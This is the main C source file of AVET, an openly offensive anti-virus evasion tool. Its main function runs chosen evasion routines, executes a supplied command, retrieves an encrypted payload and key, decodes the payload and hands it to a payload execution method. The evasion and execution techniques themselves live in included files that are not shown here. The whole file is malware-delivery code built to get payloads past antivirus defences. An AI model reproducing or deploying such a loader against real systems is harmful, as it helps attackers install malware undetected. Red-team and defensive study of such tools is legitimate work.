/*
Authors: Daniel Sauder, Florian Saager
License: https://www.gnu.org/licenses/gpl.txt or LICENSE file
Web: https://github.com/govolution/avet
*/

//     "         .==,_                                          \n"
//     "        .===,_`\\                                        \n"
//     "      .====,_ ` \\      .====,__                         \n"
//     "---     .==-,`~. \\           `:`.__,                    \n"
//     " ---      `~~=-.  \\           /^^^     MEEP MEEP        \n"
//     "   ---       `~~=. \\         /                          \n"
//     "                `~. \\       /                           \n"
//     "                  ~. \\____./                            \n"
//     "                    `.=====)                            \n"
//     "                 ___.--~~~--.__                         \n"
//     "       ___\\.--~~~              ~~~---.._|/              \n"
//     "       ~~~\\\"                             /              \n"
//     " ________  ___      ___ _______  _________  \n" 
//     "|\\   __  \\|\\  \\    /  /|\\  ___ \\|\\___   ___\\ \n"
//     "\\ \\  \\|\\  \\ \\  \\  /  / | \\   __/\\|___ \\  \\_| \n"
//     " \\ \\   __  \\ \\  \\/  / / \\ \\  \\_|/__  \\ \\  \\  \n"
//     "  \\ \\  \\ \\  \\ \\    / /   \\ \\  \\_|\\ \\  \\ \\  \\ \n"
//     "   \\ \\__\\ \\__\\ \\__/ /     \\ \\_______\\  \\ \\__\\\n"
//     "    \\|__|\\|__|\\|__|/       \\|_______|   \\|__|\n"
//         "\n\nAnti Virus Evasion Tool by Daniel Sauder, Florian Saager\n"


#include <stdio.h>
#include <stdlib.h>

// Include static data (imported C arrays)
// Defines for static retrieval are set in this file
#include "static_data/static_data.include"

// Include debug_print macro, if set.
#include "debug_print/debug_print.include"
#include "implementations/debug_print/debug_print.h"

// Include implementation files needed for the selected functions.
// The included files are assembled by the build script, in which functions are selected.
#include "evasion/evasion.include"
#include "command_exec/command_exec.include"
#include "get_command/get_command.include"
#include "get_payload/get_payload.include"
#include "get_key/get_key.include"
#include "get_payload_info/get_payload_info.include"
#include "decode_payload/decode_payload.include"
#include "payload_execution_method/payload_execution_method.include"


// Set how many evasion functions can be used at maximum
#define EVASION_ARRAY_SIZE 50
// Set the maximum length of an argument passed to the evasion function
#define EVASION_ARG_MAX_LEN 1024


// argv[1]		Is passed through as an argument to the get_payload function
// argv[2]		Is passed through as an argument to the get_key function
// argv[3]		Is passed through as an argument to the get_payload_info function
// argv[4]		Is passed through as an argument to the get_command function
int main (int argc, char **argv)
{		
	// Function prototype pointers to store selected functions.		
	void (*command_exec) (const char *command, int command_size) = NULL;
	unsigned char *(*get_command) (char *arg1, int *command_size) = NULL;
	unsigned char *(*get_payload) (char *arg1, int *payload_size) = NULL;
	unsigned char *(*get_key) (char *arg1, int *key_length) = NULL;
	unsigned char *(*get_payload_info) (char *arg1, int *payload_info_length) = NULL;
	void (*decode_payload) (const unsigned char *ciphertext, const int ciphertext_length, const unsigned char *key, const int key_length, unsigned char *plaintext) = NULL;
	void (*payload_execution_method) (unsigned char *payload, int payload_size, char *payload_info) = NULL;
	
	// Define array to store multiple evasion functions.
	// Set static array size of 10 because dynamic size handling in cooperation with build scripts would be too messy.
	// The included evasion.assign file will take care of populating the array.
	typedef void (*evasion_function) (char *arg1);
	evasion_function evasion_functions[EVASION_ARRAY_SIZE]; 
	// NULL the array to make later checks succeed
	for(int i = 0; i < EVASION_ARRAY_SIZE; i++) {
		evasion_functions[i] = NULL;
	}

    // Define array to store the argument for each evasion function.
    // The size of the argument array equals that of the evasion function array above.
    // The included evasion.assign file will take care of populating the array.
    // The contents correspond to the evasion function array, so that evasion_function_args[0] contains the argument for evasion_functions[0], etc.
    // The arguments are given as C strings.
    char evasion_function_args[EVASION_ARRAY_SIZE][EVASION_ARG_MAX_LEN];

		
	// Assign selected functions to prototypes
	// Included assignment code is assembled by the build script
	#include "evasion/evasion.assign"
	#include "command_exec/command_exec.assign"
	#include "get_command/get_command.assign"
	#include "get_payload/get_payload.assign"
	#include "get_key/get_key.assign"
	#include "get_payload_info/get_payload_info.assign"
	#include "decode_payload/decode_payload.assign"
	#include "payload_execution_method/payload_execution_method.assign"
	
	
	// Execute evasion functions
	if(evasion_functions[0] == NULL) {
		DEBUG_PRINT("No evasion techniques applied.\n");
	}	
	
	for(int i = 0; i < EVASION_ARRAY_SIZE; i++) {
		if(evasion_functions[i] != NULL) {	
			DEBUG_PRINT("Executing evasion function %d.\n", i);
            // Use the function arguments from the argument array
			evasion_functions[i](evasion_function_args[i]);
		}
	}	
	
	
	// Retrieve command to execute
	int command_size = 0;
	// If command is retrieve statically, set the argument accordingly to ensure that the correct data is delivered
	#ifdef STATIC_COMMAND
	char *command = get_command("static_command", &command_size);
	#else
	char *command = get_command(argv[4], &command_size);
	#endif
	if(command != NULL) {
		DEBUG_PRINT("Retrieved command, size is %d bytes.\n", command_size);
		for(int i = 0; i < command_size; i++) {
			DEBUG_PRINT("%02x ", command[i]);
		}
		DEBUG_PRINT("\n\n");
	} else {
		DEBUG_PRINT("No command retrieved.\n");
	}
	// Execute command after evasion functions
	DEBUG_PRINT("Calling command_exec...\n");
	command_exec(command, command_size);
	
	
	// Retrieve encoded payload
	int payload_size = 0;
	// If payload is retrieved statically, set the argument accordingly to ensure that the correct data is delivered
	#ifdef STATIC_PAYLOAD	
	unsigned char *encoded_payload = get_payload("static_payload", &payload_size);
	#else
	unsigned char *encoded_payload = get_payload(argv[1], &payload_size);
	#endif
	if(encoded_payload != NULL) {
		DEBUG_PRINT("Retrieved payload data, size is %d bytes.\n", payload_size);
		//for(int i = 0; i < payload_size; i++) {
		//	DEBUG_PRINT("%02x ", encoded_payload[i]);
		//}
		DEBUG_PRINT("\n\n");
	} else {
		DEBUG_PRINT("No payload retrieved.\n");
	}
	
	
	// Retrieve crypto key
	int key_length = 0;
	// If key is retrieved statically, set the argument accordingly to ensure that the correct data is delivered
	#ifdef STATIC_KEY
	unsigned char *key = get_key("static_key", &key_length);
	#else
	unsigned char *key = get_key(argv[2], &key_length);
	#endif
	if(key != NULL) {
		DEBUG_PRINT("Retrieved key data, key length is %d bytes.\n", key_length);
		for(int i = 0; i < key_length; i++) {
			DEBUG_PRINT("%02x ", key[i]);
		}
		DEBUG_PRINT("\n\n");
	} else {
		DEBUG_PRINT("No key retrieved.\n");
	}
	
	
	// Retrieve additional payload info
	int payload_info_length = 0;
	// If payload info is retrieved statically, set the argument accordingly to ensure that the correct data is delivered
	#ifdef STATIC_PAYLOAD_INFO
	unsigned char *payload_info = get_payload_info("static_payload_info", &payload_info_length);
	#else
	unsigned char *payload_info = get_payload_info(argv[3], &payload_info_length);
	#endif
	
	char *payload_info_string;
	if(payload_info != NULL) {
		// Create C string from payload info data to ease further use
		payload_info_string = (char *) malloc(payload_info_length + 1);
		memcpy(payload_info_string, payload_info, payload_info_length);
		payload_info_string[payload_info_length] = '\0';	
		
		DEBUG_PRINT("Retrieved additional payload info, info data length is %d bytes.\n", payload_info_length);		
		DEBUG_PRINT("payload_info: %s", payload_info_string);		
		DEBUG_PRINT("\n\n");
	} else {
		DEBUG_PRINT("No additional payload info retrieved.\n");
	}
	
	
	// Decode payload
	unsigned char* payload = (unsigned char *) malloc(payload_size);
	DEBUG_PRINT("Calling decode_payload...\n");
	decode_payload(encoded_payload, payload_size, key, key_length, payload);
	//DEBUG_PRINT("Decoded payload: \n");	
	//for(int i = 0; i < payload_size; i++) {
	//	DEBUG_PRINT("%02x ", payload[i]);
	//}
	DEBUG_PRINT("\n\n");
	
	
	// Bind and execute payload
	DEBUG_PRINT("Calling payload_execution_method...\n");
	payload_execution_method(payload, payload_size, payload_info_string);
	
	DEBUG_PRINT("Execution finished.\n");
	return 0;
}
